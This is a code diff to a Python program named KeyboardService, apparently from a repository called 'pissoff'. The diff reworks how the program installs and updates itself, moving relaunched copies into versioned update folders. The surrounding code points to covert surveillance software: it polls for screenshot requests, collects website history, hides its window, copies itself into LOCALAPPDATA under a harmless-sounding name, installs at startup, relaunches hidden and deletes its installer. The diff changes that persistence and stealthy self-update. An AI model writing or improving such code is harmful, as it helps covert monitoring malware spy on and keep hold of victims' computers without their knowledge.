@@ -47,11 +47,12 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.2.13"
+APP_VERSION = "1.2.14"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
 INSTALL_PATH = os.path.join(INSTALL_DIR, "KeyboardService.exe")
+UPDATE_DIR = os.path.join(INSTALL_DIR, "updates")
 CONFIG_PATH = os.path.join(INSTALL_DIR, "config.json")
 
 
@@ -1432,12 +1433,34 @@ def hide_current_window():
 
 def get_installed_startup_path():
     if getattr(sys, "frozen", False):
+        if is_in_update_directory(sys.executable):
+            return os.path.abspath(sys.executable)
         return os.path.abspath(INSTALL_PATH)
     return os.path.abspath(os.path.join(INSTALL_DIR, "KeyboardService.py"))
 
 
+def is_in_update_directory(path):
+    update_root = os.path.normcase(os.path.abspath(UPDATE_DIR))
+    candidate_path = os.path.normcase(os.path.abspath(path))
+    try:
+        return os.path.commonpath((update_root, candidate_path)) == update_root
+    except ValueError:
+        return False
+
+
+def create_versioned_update_directory(version):
+    safe_version = re.sub(r"[^A-Za-z0-9._-]", "_", str(version)).strip("._-")
+    if not safe_version:
+        raise RuntimeError("version cannot be used as an update folder")
+    update_directory = os.path.join(UPDATE_DIR, safe_version, uuid.uuid4().hex)
+    os.makedirs(update_directory, exist_ok=True)
+    return update_directory
+
+
 def install_self_to_startup_location():
     if getattr(sys, "frozen", False):
+        if is_in_update_directory(sys.executable):
+            return os.path.abspath(sys.executable)
         target_path = os.path.abspath(INSTALL_PATH)
         os.makedirs(INSTALL_DIR, exist_ok=True)
         if not os.path.exists(target_path):
@@ -1561,18 +1584,20 @@ def install_and_relaunch():
             return False
 
         current_path = os.path.normcase(os.path.abspath(sys.executable))
+        if is_in_update_directory(current_path):
+            return False
         installed_path = os.path.normcase(os.path.abspath(INSTALL_PATH))
         if current_path == installed_path:
             return False
 
         try:
-            os.makedirs(INSTALL_DIR, exist_ok=True)
-            if not os.path.exists(INSTALL_PATH):
-                shutil.copy2(sys.executable, INSTALL_PATH)
+            update_directory = create_versioned_update_directory(APP_VERSION)
+            updated_path = os.path.join(update_directory, UPDATE_ASSET_NAME)
+            shutil.copy2(sys.executable, updated_path)
             startup_info = subprocess.STARTUPINFO()
             startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
             startup_info.wShowWindow = 0
-            subprocess.Popen([INSTALL_PATH], close_fds=True, startupinfo=startup_info)
+            subprocess.Popen([updated_path], close_fds=True, startupinfo=startup_info)
             schedule_installer_cleanup(current_path)
             return True
         except OSError as error:
@@ -1637,8 +1662,8 @@ def download_update():
         print(f"Update {latest_tag} has no {UPDATE_ASSET_NAME} asset")
         return None
 
-    os.makedirs(INSTALL_DIR, exist_ok=True)
-    temporary_path = os.path.join(INSTALL_DIR, f"{UPDATE_ASSET_NAME}.download")
+    update_directory = create_versioned_update_directory(latest_tag)
+    temporary_path = os.path.join(update_directory, f"{UPDATE_ASSET_NAME}.download")
     download_request = Request(
         asset["browser_download_url"],
         headers={"User-Agent": f"KeyboardService/{APP_VERSION}"},
@@ -1680,9 +1705,10 @@ def send_successful_update_notice(previous_version="", new_version=""):
 
 
 def schedule_update(temporary_path, previous_version=None, new_version=None):
-    helper_path = os.path.join(INSTALL_DIR, f"update_{os.getpid()}.cmd")
-    target_path = os.path.abspath(INSTALL_PATH)
     source_path = os.path.abspath(temporary_path)
+    update_directory = os.path.dirname(source_path)
+    helper_path = os.path.join(update_directory, f"update_{os.getpid()}.cmd")
+    target_path = os.path.join(update_directory, UPDATE_ASSET_NAME)
     previous = str(previous_version or APP_VERSION).strip()
     updated = str(new_version or APP_VERSION).strip()
     lines = [
